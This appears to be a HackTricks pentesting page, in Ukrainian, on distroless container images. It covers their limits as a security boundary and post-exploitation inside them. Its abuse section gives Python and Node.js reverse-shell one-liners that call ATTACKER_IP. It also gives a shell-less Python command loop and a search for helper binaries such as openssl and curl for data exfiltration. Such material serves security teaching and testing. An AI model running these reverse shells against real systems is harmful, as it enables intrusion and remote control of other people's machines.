# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

**distroless** container image — це image, що містить **мінімальні runtime-компоненти, необхідні для запуску однієї конкретної application**, навмисно вилучаючи звичні distribution tools, такі як package managers, shells і великі набори загальних userland utilities. На практиці distroless images часто містять лише application binary або runtime, його shared libraries, certificate bundles і дуже малу структуру filesystem.

Суть не в тому, що distroless є новим kernel isolation primitive. Distroless — це **стратегія проєктування image**. Вона змінює те, що доступно **всередині filesystem контейнера**, а не спосіб, у який kernel ізолює контейнер. Це важливо, оскільки distroless hardens environment переважно шляхом зменшення кількості засобів, які attacker може використати після отримання code execution. Це не замінює namespaces, seccomp, capabilities, AppArmor, SELinux чи будь-який інший механізм runtime isolation.

## Навіщо існує Distroless

Distroless images переважно використовують для зменшення:

- розміру image
- operational complexity image
- кількості packages і binaries, які можуть містити vulnerabilities
- кількості post-exploitation tools, доступних attacker за замовчуванням

Саме тому distroless images популярні в production application deployments. Container, який не містить shell, package manager і майже жодних загальних tools, зазвичай простіше operationally контролювати та складніше інтерактивно використовувати після compromise.

Приклади відомих сімейств images у стилі distroless:

- Google's distroless images
- Chainguard hardened/minimal images

## Що не означає Distroless

Distroless container **не є**:

- автоматично rootless
- автоматично non-privileged
- автоматично read-only
- автоматично захищеним за допомогою seccomp, AppArmor або SELinux
- автоматично захищеним від container escape

Distroless image все ще можна запустити з `--privileged`, спільним використанням host namespaces, небезпечними bind mounts або змонтованим runtime socket. У такому випадку image може бути minimal, але container все одно може бути катастрофічно insecure. Distroless змінює **userland attack surface**, а не **kernel trust boundary**.

## Типові Operational Characteristics

Коли ви compromise distroless container, перше, що зазвичай помічаєте, — звичні припущення перестають бути правильними. Може не бути `sh`, `bash`, `ls`, `id`, `cat`, а іноді навіть libc-based environment, який поводиться так, як очікує ваш звичний tradecraft. Це впливає і на offense, і на defense, оскільки відсутність tools змінює debugging, incident response і post-exploitation.

Найпоширеніші patterns:

- application runtime існує, але майже нічого іншого немає
- shell-based payloads не працюють, оскільки shell відсутній
- звичні enumeration one-liners не працюють, оскільки helper binaries відсутні
- file system protections, такі як read-only rootfs або `noexec` на writable tmpfs locations, також часто присутні

Саме це поєднання зазвичай і є причиною, чому люди говорять про "weaponizing distroless".

## Distroless і Post-Exploitation

Основний offensive challenge у distroless environment — не завжди початковий RCE. Часто важливіше те, що відбувається далі. Якщо compromised workload надає code execution у language runtime, такому як Python, Node.js, Java або Go, ви можете виконувати довільну logic, але не за допомогою звичних shell-centric workflows, поширених на інших Linux targets.

Тому post-exploitation часто розвивається в одному з трьох напрямів:

1. **Безпосередньо використовувати наявний language runtime**, щоб enumerate environment, відкривати sockets, читати files або розгортати additional payloads.
2. **Завантажити власні tools у memory**, якщо filesystem є read-only або writable locations змонтовані з `noexec`.
3. **Зловживати наявними binaries, які вже присутні в image**, якщо application або її dependencies містять щось несподівано корисне.

## Abuse

### Enumerate The Runtime You Already Have

У багатьох distroless containers немає shell, але все ще є application runtime. Якщо target — Python service, Python доступний. Якщо target — Node.js, доступний Node.js. Цього часто достатньо, щоб enumerate files, читати environment variables, відкривати reverse shells і виконувати payloads in-memory, не викликаючи `/bin/sh`.

Простий приклад із Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Простий приклад із Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Вплив:

- відновлення змінних середовища, які часто містять credentials або service endpoints
- перерахування файлової системи без `/bin/ls`
- виявлення шляхів, доступних для запису, і змонтованих secrets

### Reverse Shell Без `/bin/sh`

Якщо образ не містить `sh` або `bash`, класичний reverse shell на основі shell може одразу завершитися помилкою. У такій ситуації використовуйте встановлений language runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Якщо `/bin/sh` не існує, замініть останній рядок на безпосереднє виконання команд через Python або цикл REPL Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Знову ж таки, якщо `/bin/sh` відсутній, використовуйте безпосередньо файлові, процесні та мережеві API Node замість запуску shell.

### Повний приклад: цикл команд Python без shell

Якщо в image є Python, але повністю відсутній shell, простого інтерактивного циклу часто достатньо, щоб зберегти повні можливості post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Для цього не потрібен бінарний файл інтерактивної оболонки. З погляду атакувальника вплив фактично такий самий, як і від базової оболонки: виконання команд, перерахування та staging подальших payloads через наявний runtime.

### Виконання інструментів у пам'яті

Distroless-образи часто використовуються разом із:

- `readOnlyRootFilesystem: true`
- доступним для запису, але `noexec` tmpfs, наприклад `/dev/shm`
- відсутністю інструментів керування пакетами

Таке поєднання робить класичний сценарій «завантажити бінарний файл на диск і запустити його» ненадійним. У таких випадках основним рішенням стають техніки виконання в пам'яті.

Окрема сторінка присвячена цьому:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Найбільш релевантні техніки на ній:

- `memfd_create` + `execve` через scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Уже наявні бінарні файли в образі

Деякі distroless-образи все ще містять операційно необхідні бінарні файли, які стають корисними після компрометації. Часто спостережуваним прикладом є `openssl`, оскільки застосункам іноді він потрібен для завдань, пов'язаних із криптографією або TLS.

Шаблон для швидкого пошуку:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Якщо присутній `openssl`, його можна використовувати для:

- вихідних TLS-з'єднань
- data exfiltration через дозволений канал вихідного трафіку
- підготовки даних payload через закодовані/зашифровані blobs

Точний спосіб зловживання залежить від того, що саме встановлено, але загальна ідея полягає в тому, що distroless не означає "повну відсутність інструментів"; це означає "значно менше інструментів, ніж у звичайному образі дистрибутива".

## Перевірки

Мета цих перевірок — визначити, чи справді образ є distroless на практиці, а також які runtime або helper binaries усе ще доступні для post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Що тут цікаво:

- Якщо shell відсутній, але доступний runtime, такий як Python або Node, post-exploitation має перейти до виконання під керуванням runtime.
- Якщо коренева файлова система доступна лише для читання, а `/dev/shm` доступний для запису, але має `noexec`, техніки виконання в пам'яті стають набагато актуальнішими.
- Якщо присутні допоміжні бінарні файли, такі як `openssl`, `busybox` або `java`, вони можуть надавати достатньо функціональності для подальшого отримання доступу.

## Типові налаштування runtime

| Стиль образу / платформи | Стан за замовчуванням | Типова поведінка | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Образи в стилі Google distroless | Мінімальний userland за задумом | Відсутні shell і менеджер пакетів, доступні лише залежності застосунку/runtime | додавання шарів для налагодження, sidecar shell, копіювання busybox або інструментів |
| Мінімальні образи Chainguard | Мінімальний userland за задумом | Зменшена поверхня пакетів, часто орієнтація на один runtime або сервіс | використання `:latest-dev` або debug-варіантів, копіювання інструментів під час build |
| Kubernetes workloads із distroless-образами | Залежить від конфігурації Pod | Distroless впливає лише на userland; рівень безпеки Pod також залежить від специфікації Pod і типових налаштувань runtime | додавання ephemeral debug containers, монтування host, привілейовані налаштування Pod |
| Docker / Podman із distroless-образами | Залежить від прапорців запуску | Мінімальна файлова система, але безпека runtime все одно залежить від прапорців і конфігурації daemon | `--privileged`, спільне використання host namespace, монтування runtime socket, доступні для запису host binds |

Ключовий момент полягає в тому, що distroless — це **властивість образу**, а не захист runtime. Його цінність полягає у зменшенні доступного всередині файлової системи після компрометації.

## Пов'язані сторінки

Щодо bypass для файлової системи та виконання в пам'яті, які зазвичай потрібні в distroless-середовищах:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Щодо зловживання container runtime, socket і mount, яке все ще застосовне до distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
